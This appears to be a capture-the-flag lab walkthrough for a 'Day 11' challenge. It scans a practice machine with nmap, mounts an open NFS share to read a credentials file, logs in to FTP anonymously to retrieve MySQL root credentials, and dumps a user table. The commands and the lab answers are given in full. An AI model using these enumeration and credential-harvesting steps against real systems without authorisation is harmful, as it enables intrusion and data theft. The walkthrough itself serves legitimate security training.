# [Day 11] Elf Applications

## Instructions

McSkidy has been happy with the progress they've been making, but there's still so much to do. One of their main servers has some integral services running, but they can't access these services. Did the Christmas Monster lock them out? 

Deploy the machine and starting scanning the IP. The machine may take a few minutes to boot up. 

Check out the supporting material [here](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#).


## #1 - What is the password inside the creds.txt file?

Let's start by scanning the machine.

~~~
$ sudo nmap -sS -sV -A 10.10.125.220
[sudo] password for unknown: 

Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-02 10:38 PDT
Nmap scan report for 10.10.125.220
Host is up (0.045s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 500 OOPS: invalid pasv_address
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.35.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  3           2049/udp  nfs
|   100003  3,4         2049/tcp  nfs
|   100005  1,2,3      20048/tcp  mountd
|   100005  1,2,3      20048/udp  mountd
|   100021  1,3,4      38543/tcp  nlockmgr
|   100021  1,3,4      50281/udp  nlockmgr
|   100024  1          43725/tcp  status
|   100024  1          50464/udp  status
|   100227  3           2049/tcp  nfs_acl
|_  100227  3           2049/udp  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
3306/tcp open  mysql   MySQL 5.7.28
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.28
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, SupportsTransactions, SupportsLoadDataLocal, LongColumnFlag, SwitchToSSLAfterHandshake, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongPassword, SupportsCompression, ODBCClient, Speaks41ProtocolNew, InteractiveClient, Support41Auth, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: B_YW*W\x0B!g`r&ueM\x0B\x12\x07\x0B!
|_  Auth Plugin Name: 79
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/2%OT=21%CT=1%CU=30273%PV=Y%DS=2%DC=T%G=Y%TM=5EADB043
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:6%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=FF%W=6903%O=M508NNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)

Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   46.20 ms 10.9.0.1
2   45.19 ms 10.10.125.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.97 seconds
~~~

NFS is running on port 2049/tcp. Let's list the remote shares:

~~~
$ sudo apt install nfs-common
$ showmount -e 10.10.125.220
Export list for 10.10.125.220:
/opt/files *
~~~

Now, let's mount the remote share and dump the content of the remote file.

~~~
$ sudo mkdir /mnt/nfs
$ sudo mount -t nfs 10.10.125.220:/opt/files /mnt/nfs/
$ ls -l /mnt/nfs/
total 4
-rwxrwxrwx 1 unknown unknown 34 Dec 10 08:52 creds.txt
$ cat /mnt/nfs/creds.txt 
the password is securepassword123
~~~

Answer: `securepassword123`

## #2 - What is the name of the file running on port 21?

There is a FTP server running on default port 21/tcp, which allows anonymous connections. Listing the files, we find a file named `file.txt`, that we download using the `get` command:

~~~
$ ftp 10.10.125.220
Connected to 10.10.125.220.
220 (vsFTPd 3.0.2)
Name (10.10.125.220:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0              39 Dec 10 23:19 file.txt
drwxr-xr-x    2 0        0               6 Nov 04 08:50 pub
d-wx-wx--x    2 14       50              6 Nov 04 08:50 uploads
-rw-r--r--    1 0        0             224 Nov 04 08:46 welcome.msg
226 Directory send OK.
ftp> get file.txt
local: file.txt remote: file.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for file.txt (39 bytes).
226 Transfer complete.
39 bytes received in 0.00 secs (624.3596 kB/s)
ftp> quit
221 Goodbye.
~~~

Answer: `file.txt`

## #3 - What is the password after enumerating the database?

The file we have downloaded discloses the credentials of the MySQL database:

~~~
$ cat file.txt 
remember to wipe mysql:
root
ff912ABD*
~~~

Let's connect to the MySQL database using the credentials gathered from the `file.txt` file we gathered via FTP:

~~~
$ mysql -h 10.10.125.220 -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.28 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
~~~

We are connected. Now let's list the databases:

~~~
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.07 sec)
~~~

Let's list the tables in the `data` database:

~~~
mysql> use data
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
1 row in set (0.04 sec)
~~~

Let's dump the content of the `USERS` table:

~~~
mysql> select * from USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | bestpassword |
+-------+--------------+
1 row in set (0.04 sec)
~~~

Answer: `bestpassword`
